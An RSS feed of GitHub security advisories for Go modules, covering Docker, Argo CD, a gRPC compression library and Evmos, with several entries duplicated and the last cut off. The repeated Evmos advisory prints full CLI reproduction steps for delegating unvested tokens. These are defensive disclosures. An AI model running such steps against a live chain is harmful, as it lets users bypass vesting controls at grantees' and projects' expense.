<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
    <title>Security Advisory for Go modules</title>
    <updated>2024-06-10T19:01:17.396Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
    <subtitle>Security Advisory for Go modules on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[github.com/docker/docker] Moby (Docker Engine) is vulnerable to Ambiguous OCI manifest parsing]]></title>
        <id>https://github.com/advisories/GHSA-xmmx-7jpf-fx42</id>
        <link href="https://github.com/advisories/GHSA-xmmx-7jpf-fx42"/>
        <updated>2024-06-10T18:39:04.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>In the OCI Distribution Specification version 1.0.0 and prior and in the OCI Image Specification version 1.0.1 and prior, manifest and index documents are ambiguous without an accompanying Content-Type HTTP header.  Versions of Moby (Docker Engine) prior to 20.10.11 treat the Content-Type header as trusted and deserialize the document according to that header.  If the Content-Type header changed between pulls of the same ambiguous document (with the same digest), the document may be interpreted differently, meaning that the digest alone is insufficient to unambiguously identify the content of the image.</p>
<h3 id="patches">Patches</h3>
<p>This issue has been fixed in Moby (Docker Engine) 20.10.11.  Image pulls for manifests that contain a “manifests” field or indices which contain a “layers” field are rejected.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Ensure you only pull images from trusted sources.</p>
<h3 id="references">References</h3>
<p><a href="https://github.com/opencontainers/distribution-spec/security/advisories/GHSA-mc8v-mgrf-8f4m">https://github.com/opencontainers/distribution-spec/security/advisories/GHSA-mc8v-mgrf-8f4m</a>
<a href="https://github.com/opencontainers/image-spec/security/advisories/GHSA-77vh-xpmg-72qh">https://github.com/opencontainers/image-spec/security/advisories/GHSA-77vh-xpmg-72qh</a></p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li><a href="https://github.com/moby/moby/issues/new">Open an issue in</a></li>
<li>Email us at <a href="mailto:security@docker.com">security@docker.com</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/moby/moby/security/advisories/GHSA-xmmx-7jpf-fx42">https://github.com/moby/moby/security/advisories/GHSA-xmmx-7jpf-fx42</a></li>
<li><a href="https://github.com/advisories/GHSA-xmmx-7jpf-fx42">https://github.com/advisories/GHSA-xmmx-7jpf-fx42</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xmmx-7jpf-fx42</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-10T18:39:03.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/docker/cli] Docker CLI leaks private registry credentials to registry-1.docker.io]]></title>
        <id>https://github.com/advisories/GHSA-99pg-grm5-qq3v</id>
        <link href="https://github.com/advisories/GHSA-99pg-grm5-qq3v"/>
        <updated>2024-06-10T18:38:52.000Z</updated>
        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
<p>A bug was found in the Docker CLI where running <code>docker login my-private-registry.example.com</code> with a misconfigured configuration file (typically <code>~/.docker/config.json</code>) listing a <code>credsStore</code> or <code>credHelpers</code> that could not be executed would result in any provided credentials being sent to <code>registry-1.docker.io</code> rather than the intended private registry.</p>
<h2 id="patches">Patches</h2>
<p>This bug has been fixed in Docker CLI 20.10.9.  Users should update to this version as soon as possible.</p>
<h2 id="workarounds">Workarounds</h2>
<p>Ensure that any configured <code>credsStore</code> or <code>credHelpers</code> entries in the configuration file reference an installed credential helper that is executable and on the <code>PATH</code>.</p>
<h2 id="for-more-information">For more information</h2>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li><a href="https://github.com/docker/cli/issues/new/choose">Open an issue</a></li>
<li>Email us at <a href="mailto:security@docker.com">security@docker.com</a> if you think you’ve found a security bug</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/docker/cli/security/advisories/GHSA-99pg-grm5-qq3v">https://github.com/docker/cli/security/advisories/GHSA-99pg-grm5-qq3v</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-41092">https://nvd.nist.gov/vuln/detail/CVE-2021-41092</a></li>
<li><a href="https://github.com/docker/cli/commit/893e52cf4ba4b048d72e99748e0f86b2767c6c6b">https://github.com/docker/cli/commit/893e52cf4ba4b048d72e99748e0f86b2767c6c6b</a></li>
<li><a href="https://cert-portal.siemens.com/productcert/pdf/ssa-222547.pdf">https://cert-portal.siemens.com/productcert/pdf/ssa-222547.pdf</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/B5Q6G6I4W5COQE25QMC7FJY3I3PAYFBB/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/B5Q6G6I4W5COQE25QMC7FJY3I3PAYFBB/</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ZNFADTCHHYWVM6W4NJ6CB4FNFM2VMBIB/">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ZNFADTCHHYWVM6W4NJ6CB4FNFM2VMBIB/</a></li>
<li><a href="https://github.com/advisories/GHSA-99pg-grm5-qq3v">https://github.com/advisories/GHSA-99pg-grm5-qq3v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-99pg-grm5-qq3v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-10T18:38:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/docker/docker] `docker cp` allows unexpected chmod of host files in Moby Docker Engine]]></title>
        <id>https://github.com/advisories/GHSA-v994-f8vw-g7j4</id>
        <link href="https://github.com/advisories/GHSA-v994-f8vw-g7j4"/>
        <updated>2024-06-10T18:38:44.000Z</updated>
        <content type="html"><![CDATA[<h2 id="impact">Impact</h2>
<p>A bug was found in Moby (Docker Engine) where attempting to copy files using <code>docker cp</code> into a specially-crafted container can result in Unix file permission changes for existing files in the host’s filesystem, widening access to others. This bug does not directly allow files to be read, modified, or executed without an additional cooperating process.</p>
<h2 id="patches">Patches</h2>
<p>This bug has been fixed in Moby (Docker Engine) 20.10.9. Users should update to this version as soon as possible. Running containers do not need to be restarted.</p>
<h2 id="workarounds">Workarounds</h2>
<p>Ensure you only run trusted containers.</p>
<h2 id="credits">Credits</h2>
<p>The Moby project would like to thank Lei Wang and Ruizhi Xiao for responsibly disclosing this issue in accordance with the ﻿<a href="https://github.com/moby/moby/blob/master/SECURITY.md">Moby security policy</a>.</p>
<h2 id="for-more-information">For more information</h2>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li><a href="https://github.com/moby/moby/issues/new">Open an issue</a></li>
<li>Email us at ﻿ <a href="mailto:security@docker.com">security@docker.com</a> ﻿ if you think you’ve found a security bug</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/moby/moby/security/advisories/GHSA-v994-f8vw-g7j4">https://github.com/moby/moby/security/advisories/GHSA-v994-f8vw-g7j4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-41089">https://nvd.nist.gov/vuln/detail/CVE-2021-41089</a></li>
<li><a href="https://github.com/moby/moby/commit/bce32e5c93be4caf1a592582155b9cb837fc129a">https://github.com/moby/moby/commit/bce32e5c93be4caf1a592582155b9cb837fc129a</a></li>
<li><a href="https://cert-portal.siemens.com/productcert/pdf/ssa-222547.pdf">https://cert-portal.siemens.com/productcert/pdf/ssa-222547.pdf</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/B5Q6G6I4W5COQE25QMC7FJY3I3PAYFBB">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/B5Q6G6I4W5COQE25QMC7FJY3I3PAYFBB</a></li>
<li><a href="https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ZNFADTCHHYWVM6W4NJ6CB4FNFM2VMBIB">https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ZNFADTCHHYWVM6W4NJ6CB4FNFM2VMBIB</a></li>
<li><a href="https://github.com/advisories/GHSA-v994-f8vw-g7j4">https://github.com/advisories/GHSA-v994-f8vw-g7j4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v994-f8vw-g7j4</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-06-10T18:38:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/mostynb/go-grpc-compression] go-grpc-compression has a zstd decompression bombing vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-87m9-rv8p-rgmg</id>
        <link href="https://github.com/advisories/GHSA-87m9-rv8p-rgmg"/>
        <updated>2024-06-10T18:36:24.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A malicious user could cause a denial of service (DoS) when using a specially crafted gRPC request. The decompression mechanism for zstd did not respect the limits imposed by gRPC, allowing rapid memory usage increases.</p>
<p>Versions v1.1.4 through to v1.2.2 made use of the Decoder.DecodeAll function in github.com/klauspost/compress/zstd to decompress data provided by the peer. The vulnerability is exploitable only by attackers who can send gRPC payloads to users of github.com/mostynb/go-grpc-compression/zstd or github.com/mostynb/go-grpc-compression/nonclobbering/zstd.</p>
<h3 id="patches">Patches</h3>
<p>Version v1.2.3  of github.com/mostynb/go-grpc-compression avoids the issue by not using the Decoder.DecodeAll function in github.com/klauspost/compress/zstd.</p>
<p>All users of github.com/mostynb/go-grpc-compression/zstd or github.com/mostynb/go-grpc-compression/nonclobbering/zstd in the affected versions should update to v1.2.3.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Other compression formats were not affected, users may consider switching from zstd to another format without upgrading to a newer release.</p>
<h3 id="references">References</h3>
<p>This issue was uncovered during a security audit performed by <a href="https://github.com/stamparm/">Miroslav Stampar</a> of <a href="https://7asecurity.com/">7ASecurity</a>, facilitated by <a href="https://ostif.org/">OSTIF</a>, for the OpenTelemetry project.</p>
<p><a href="https://opentelemetry.io/blog/2024/cve-2024-36129">https://opentelemetry.io/blog/2024/cve-2024-36129</a>
<a href="https://github.com/open-telemetry/opentelemetry-collector/security/advisories/GHSA-c74f-6mfw-mm4v">https://github.com/open-telemetry/opentelemetry-collector/security/advisories/GHSA-c74f-6mfw-mm4v</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/mostynb/go-grpc-compression/security/advisories/GHSA-87m9-rv8p-rgmg">https://github.com/mostynb/go-grpc-compression/security/advisories/GHSA-87m9-rv8p-rgmg</a></li>
<li><a href="https://github.com/mostynb/go-grpc-compression/commit/629c44d3acb9624993cc7de629f47d72109e2ce5">https://github.com/mostynb/go-grpc-compression/commit/629c44d3acb9624993cc7de629f47d72109e2ce5</a></li>
<li><a href="https://github.com/advisories/GHSA-87m9-rv8p-rgmg">https://github.com/advisories/GHSA-87m9-rv8p-rgmg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-87m9-rv8p-rgmg</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-06-10T18:36:23.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/argoproj/argo-cd/v2/server] Unauthenticated Access to sensitive settings in Argo CD]]></title>
        <id>https://github.com/advisories/GHSA-87p9-x75h-p4j2</id>
        <link href="https://github.com/advisories/GHSA-87p9-x75h-p4j2"/>
        <updated>2024-06-06T21:27:45.000Z</updated>
        <content type="html"><![CDATA[<h1 id="summary">Summary</h1>
<p>The CVE allows unauthorized access to the sensitive settings exposed by  /api/v1/settings endpoint without authentication. </p>
<h1 id="details">Details</h1>
<h2 id="unauthenticated-access"><strong>Unauthenticated Access:</strong></h2>
<h3 id="endpoint-apiv1settings">Endpoint: /api/v1/settings</h3>
<p>Description: This endpoint is accessible without any form of authentication as expected. All sensitive settings are hidden except <code>passwordPattern</code>. </p>
<p>Patches
A patch for this vulnerability has been released in the following Argo CD versions:</p>
<p>v2.11.3
v2.10.12
v2.9.17</p>
<h1 id="impact">Impact</h1>
<h2 id="unauthenticated-access-1">Unauthenticated Access:</h2>
<ul>
<li>Type: Unauthorized Information Disclosure.</li>
<li>Affected Parties: All users and administrators of the Argo CD instance.</li>
<li>Potential Risks: Exposure of sensitive configuration data, including but not limited to deployment settings, security configurations, and internal network information.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/argoproj/argo-cd/security/advisories/GHSA-87p9-x75h-p4j2">https://github.com/argoproj/argo-cd/security/advisories/GHSA-87p9-x75h-p4j2</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-37152">https://nvd.nist.gov/vuln/detail/CVE-2024-37152</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/256d90178b11b04bc8174d08d7b663a2a7b1771b">https://github.com/argoproj/argo-cd/commit/256d90178b11b04bc8174d08d7b663a2a7b1771b</a></li>
<li><a href="https://github.com/advisories/GHSA-87p9-x75h-p4j2">https://github.com/advisories/GHSA-87p9-x75h-p4j2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-87p9-x75h-p4j2</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-06T21:27:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/argoproj/argo-cd/v2/server] Unauthenticated Access to sensitive settings in Argo CD]]></title>
        <id>https://github.com/advisories/GHSA-87p9-x75h-p4j2</id>
        <link href="https://github.com/advisories/GHSA-87p9-x75h-p4j2"/>
        <updated>2024-06-06T21:27:45.000Z</updated>
        <content type="html"><![CDATA[<h1 id="summary">Summary</h1>
<p>The CVE allows unauthorized access to the sensitive settings exposed by  /api/v1/settings endpoint without authentication. </p>
<h1 id="details">Details</h1>
<h2 id="unauthenticated-access"><strong>Unauthenticated Access:</strong></h2>
<h3 id="endpoint-apiv1settings">Endpoint: /api/v1/settings</h3>
<p>Description: This endpoint is accessible without any form of authentication as expected. All sensitive settings are hidden except <code>passwordPattern</code>. </p>
<p>Patches
A patch for this vulnerability has been released in the following Argo CD versions:</p>
<p>v2.11.3
v2.10.12
v2.9.17</p>
<h1 id="impact">Impact</h1>
<h2 id="unauthenticated-access-1">Unauthenticated Access:</h2>
<ul>
<li>Type: Unauthorized Information Disclosure.</li>
<li>Affected Parties: All users and administrators of the Argo CD instance.</li>
<li>Potential Risks: Exposure of sensitive configuration data, including but not limited to deployment settings, security configurations, and internal network information.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/argoproj/argo-cd/security/advisories/GHSA-87p9-x75h-p4j2">https://github.com/argoproj/argo-cd/security/advisories/GHSA-87p9-x75h-p4j2</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-37152">https://nvd.nist.gov/vuln/detail/CVE-2024-37152</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/256d90178b11b04bc8174d08d7b663a2a7b1771b">https://github.com/argoproj/argo-cd/commit/256d90178b11b04bc8174d08d7b663a2a7b1771b</a></li>
<li><a href="https://github.com/advisories/GHSA-87p9-x75h-p4j2">https://github.com/advisories/GHSA-87p9-x75h-p4j2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-87p9-x75h-p4j2</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-06T21:27:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/argoproj/argo-cd/v2/server] Unauthenticated Access to sensitive settings in Argo CD]]></title>
        <id>https://github.com/advisories/GHSA-87p9-x75h-p4j2</id>
        <link href="https://github.com/advisories/GHSA-87p9-x75h-p4j2"/>
        <updated>2024-06-06T21:27:45.000Z</updated>
        <content type="html"><![CDATA[<h1 id="summary">Summary</h1>
<p>The CVE allows unauthorized access to the sensitive settings exposed by  /api/v1/settings endpoint without authentication. </p>
<h1 id="details">Details</h1>
<h2 id="unauthenticated-access"><strong>Unauthenticated Access:</strong></h2>
<h3 id="endpoint-apiv1settings">Endpoint: /api/v1/settings</h3>
<p>Description: This endpoint is accessible without any form of authentication as expected. All sensitive settings are hidden except <code>passwordPattern</code>. </p>
<p>Patches
A patch for this vulnerability has been released in the following Argo CD versions:</p>
<p>v2.11.3
v2.10.12
v2.9.17</p>
<h1 id="impact">Impact</h1>
<h2 id="unauthenticated-access-1">Unauthenticated Access:</h2>
<ul>
<li>Type: Unauthorized Information Disclosure.</li>
<li>Affected Parties: All users and administrators of the Argo CD instance.</li>
<li>Potential Risks: Exposure of sensitive configuration data, including but not limited to deployment settings, security configurations, and internal network information.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/argoproj/argo-cd/security/advisories/GHSA-87p9-x75h-p4j2">https://github.com/argoproj/argo-cd/security/advisories/GHSA-87p9-x75h-p4j2</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-37152">https://nvd.nist.gov/vuln/detail/CVE-2024-37152</a></li>
<li><a href="https://github.com/argoproj/argo-cd/commit/256d90178b11b04bc8174d08d7b663a2a7b1771b">https://github.com/argoproj/argo-cd/commit/256d90178b11b04bc8174d08d7b663a2a7b1771b</a></li>
<li><a href="https://github.com/advisories/GHSA-87p9-x75h-p4j2">https://github.com/advisories/GHSA-87p9-x75h-p4j2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-87p9-x75h-p4j2</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-06T21:27:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/evmos/evmos/v6] Evmos allows unvested token delegations]]></title>
        <id>https://github.com/advisories/GHSA-7hrh-v6wp-53vw</id>
        <link href="https://github.com/advisories/GHSA-7hrh-v6wp-53vw"/>
        <updated>2024-06-06T21:32:01.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><em>What kind of vulnerability is it? Who is impacted?</em></p>
<p>At the moment, users are able to delegate tokens that have not yet been vested. This affects employees and grantees who have funds managed via <code>ClawbackVestingAccount</code>.</p>
<h3 id="patches">Patches</h3>
<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>
<p><a href="https://github.com/evmos/evmos-ghsa-7hrh-v6wp-53vw/pull/1">The PR linked to this advisory</a> includes part of the fix. The remainder is in a <a href="https://github.com/evmos/cosmos-sdk/security/advisories/GHSA-wj6f-x5wv-8pqv">second advisory on the Cosmos SDK fork</a>.</p>
<h3 id="workarounds">Workarounds</h3>
<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>
<p>There is no effective workaround to fix or remediate this issue without a new release. The best solution is to contain the information about this vulnerability to minimize the number of users who know about it and can thus exploit it.</p>
<h3 id="references">References</h3>
<p><em>Are there any links users can visit to find out more?</em></p>
<p>See the integration tests for more details on the exploit, or use the following to reproduce it on the CLI:</p>
<ol>
<li>Download <code>vesting_setup.json</code> with the following contents:</li>
</ol>
<pre><code>{
  "start_time": 1679602272,
  "periods": [
    {
      "coins": "100000000000000000000aevmos",
      "length_seconds": 10 
    },
    {
      "coins": "100000000000000000000aevmos",
      "length_seconds": 259200000
    }
  ]
}
</code></pre>
<ol start="2">
<li>Run the following CLI commands to reproduce the issue locally:</li>
</ol>
<pre><code>evmosd tx vesting create-clawback-vesting-account evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --vesting vesting_setup.json --from dev0 --fees 2000000000000000aevmos --home ~/.tmp-evmosd --yes

# Verify that the balance contains zero locked tokens, 1000000000000000aevmos vested, 1000000000000000aevmos unvested
evmosd q vesting balances evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --home ~/.tmp-evmosd

evmosd keys add key1 --recover --home ~/.tmp-evmosd
# Enter the following mnemonic
skate tell option purity cattle poverty street act bone govern way various

evmosd q staking validators --home ~/.tmp-evmosd | grep operator_address

# Substitute the operator address from the previous query
# Note that this delegates 70% of the user's available stake
evmosd tx staking delegate &lt;operator_address&gt; 70000000000000000000aevmos --fees 5000000000000000aevmos --gas 300000 --from key1 --home ~/.tmp-evmosd --yes

# Re-run the same command
evmosd tx staking delegate &lt;operator_address&gt; 70000000000000000000aevmos --fees 5000000000000000aevmos --gas 300000 --from key1 --home ~/.tmp-evmosd --yes

# Note that the total delegations now exceed the user's vested balance
evmosd q staking delegations evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --home ~/.tmp-evmosd
</code></pre>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/evmos/evmos/security/advisories/GHSA-7hrh-v6wp-53vw">https://github.com/evmos/evmos/security/advisories/GHSA-7hrh-v6wp-53vw</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-37154">https://nvd.nist.gov/vuln/detail/CVE-2024-37154</a></li>
<li><a href="https://github.com/advisories/GHSA-7hrh-v6wp-53vw">https://github.com/advisories/GHSA-7hrh-v6wp-53vw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7hrh-v6wp-53vw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-06T19:10:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/evmos/evmos/v7] Evmos allows unvested token delegations]]></title>
        <id>https://github.com/advisories/GHSA-7hrh-v6wp-53vw</id>
        <link href="https://github.com/advisories/GHSA-7hrh-v6wp-53vw"/>
        <updated>2024-06-06T21:32:01.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><em>What kind of vulnerability is it? Who is impacted?</em></p>
<p>At the moment, users are able to delegate tokens that have not yet been vested. This affects employees and grantees who have funds managed via <code>ClawbackVestingAccount</code>.</p>
<h3 id="patches">Patches</h3>
<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>
<p><a href="https://github.com/evmos/evmos-ghsa-7hrh-v6wp-53vw/pull/1">The PR linked to this advisory</a> includes part of the fix. The remainder is in a <a href="https://github.com/evmos/cosmos-sdk/security/advisories/GHSA-wj6f-x5wv-8pqv">second advisory on the Cosmos SDK fork</a>.</p>
<h3 id="workarounds">Workarounds</h3>
<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>
<p>There is no effective workaround to fix or remediate this issue without a new release. The best solution is to contain the information about this vulnerability to minimize the number of users who know about it and can thus exploit it.</p>
<h3 id="references">References</h3>
<p><em>Are there any links users can visit to find out more?</em></p>
<p>See the integration tests for more details on the exploit, or use the following to reproduce it on the CLI:</p>
<ol>
<li>Download <code>vesting_setup.json</code> with the following contents:</li>
</ol>
<pre><code>{
  "start_time": 1679602272,
  "periods": [
    {
      "coins": "100000000000000000000aevmos",
      "length_seconds": 10 
    },
    {
      "coins": "100000000000000000000aevmos",
      "length_seconds": 259200000
    }
  ]
}
</code></pre>
<ol start="2">
<li>Run the following CLI commands to reproduce the issue locally:</li>
</ol>
<pre><code>evmosd tx vesting create-clawback-vesting-account evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --vesting vesting_setup.json --from dev0 --fees 2000000000000000aevmos --home ~/.tmp-evmosd --yes

# Verify that the balance contains zero locked tokens, 1000000000000000aevmos vested, 1000000000000000aevmos unvested
evmosd q vesting balances evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --home ~/.tmp-evmosd

evmosd keys add key1 --recover --home ~/.tmp-evmosd
# Enter the following mnemonic
skate tell option purity cattle poverty street act bone govern way various

evmosd q staking validators --home ~/.tmp-evmosd | grep operator_address

# Substitute the operator address from the previous query
# Note that this delegates 70% of the user's available stake
evmosd tx staking delegate &lt;operator_address&gt; 70000000000000000000aevmos --fees 5000000000000000aevmos --gas 300000 --from key1 --home ~/.tmp-evmosd --yes

# Re-run the same command
evmosd tx staking delegate &lt;operator_address&gt; 70000000000000000000aevmos --fees 5000000000000000aevmos --gas 300000 --from key1 --home ~/.tmp-evmosd --yes

# Note that the total delegations now exceed the user's vested balance
evmosd q staking delegations evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --home ~/.tmp-evmosd
</code></pre>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/evmos/evmos/security/advisories/GHSA-7hrh-v6wp-53vw">https://github.com/evmos/evmos/security/advisories/GHSA-7hrh-v6wp-53vw</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-37154">https://nvd.nist.gov/vuln/detail/CVE-2024-37154</a></li>
<li><a href="https://github.com/advisories/GHSA-7hrh-v6wp-53vw">https://github.com/advisories/GHSA-7hrh-v6wp-53vw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7hrh-v6wp-53vw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-06T19:10:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/evmos/evmos/v8] Evmos allows unvested token delegations]]></title>
        <id>https://github.com/advisories/GHSA-7hrh-v6wp-53vw</id>
        <link href="https://github.com/advisories/GHSA-7hrh-v6wp-53vw"/>
        <updated>2024-06-06T21:32:01.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p><em>What kind of vulnerability is it? Who is impacted?</em></p>
<p>At the moment, users are able to delegate tokens that have not yet been vested. This affects employees and grantees who have funds managed via <code>ClawbackVestingAccount</code>.</p>
<h3 id="patches">Patches</h3>
<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>
<p><a href="https://github.com/evmos/evmos-ghsa-7hrh-v6wp-53vw/pull/1">The PR linked to this advisory</a> includes part of the fix. The remainder is in a <a href="https://github.com/evmos/cosmos-sdk/security/advisories/GHSA-wj6f-x5wv-8pqv">second advisory on the Cosmos SDK fork</a>.</p>
<h3 id="workarounds">Workarounds</h3>
<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>
<p>There is no effective workaround to fix or remediate this issue without a new release. The best solution is to contain the information about this vulnerability to minimize the number of users who know about it and can thus exploit it.</p>
<h3 id="references">References</h3>
<p><em>Are there any links users can visit to find out more?</em></p>
<p>See the integration tests for more details on the exploit, or use the following to reproduce it on the CLI:</p>
<ol>
<li>Download <code>vesting_setup.json</code> with the following contents:</li>
</ol>
<pre><code>{
  "start_time": 1679602272,
  "periods": [
    {
      "coins": "100000000000000000000aevmos",
      "length_seconds": 10 
    },
    {
      "coins": "100000000000000000000aevmos",
      "length_seconds": 259200000
    }
  ]
}
</code></pre>
<ol start="2">
<li>Run the following CLI commands to reproduce the issue locally:</li>
</ol>
<pre><code>evmosd tx vesting create-clawback-vesting-account evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --vesting vesting_setup.json --from dev0 --fees 2000000000000000aevmos --home ~/.tmp-evmosd --yes

# Verify that the balance contains zero locked tokens, 1000000000000000aevmos vested, 1000000000000000aevmos unvested
evmosd q vesting balances evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --home ~/.tmp-evmosd

evmosd keys add key1 --recover --home ~/.tmp-evmosd
# Enter the following mnemonic
skate tell option purity cattle poverty street act bone govern way various

evmosd q staking validators --home ~/.tmp-evmosd | grep operator_address

# Substitute the operator address from the previous query
# Note that this delegates 70% of the user's available stake
evmosd tx staking delegate &lt;operator_address&gt; 70000000000000000000aevmos --fees 5000000000000000aevmos --gas 300000 --from key1 --home ~/.tmp-evmosd --yes

# Re-run the same command
evmosd tx staking delegate &lt;operator_address&gt; 70000000000000000000aevmos --fees 5000000000000000aevmos --gas 300000 --from key1 --home ~/.tmp-evmosd --yes

# Note that the total delegations now exceed the user's vested balance
evmosd q staking delegations evmos1rn7fmq6he0s4uz9mwzzqwwm7fmmepd39cusn0t --home ~/.tmp-evmosd
</code></pre>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/evmos/evmos/security/advisories/GHSA-7hrh-v6wp-53vw">https://github.com/evmos/evmos/security/advisories/GHSA-7hrh-v6wp-53vw</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-37154">https://nvd.nist.gov/vuln/detail/CVE-2024-37154</a></li>
<li><a href="https://github.com/advisories/GHSA-7hrh-v6wp-53vw">https://github.com/advisories/GHSA-7hrh-v6wp-53vw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7hrh-v6wp-53vw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-06-06T19:10:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/evmos/evmos/v9] Evmos allows unvested token delegations]]></title>
        <id>https://github.com/advisories/GHSA-7hrh-v6wp-53vw</id>
        <link href="https://github.com/advisories/GHSA-7hrh-v6wp-53vw"/>
        <updated>2024-06-06T21:32:01.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
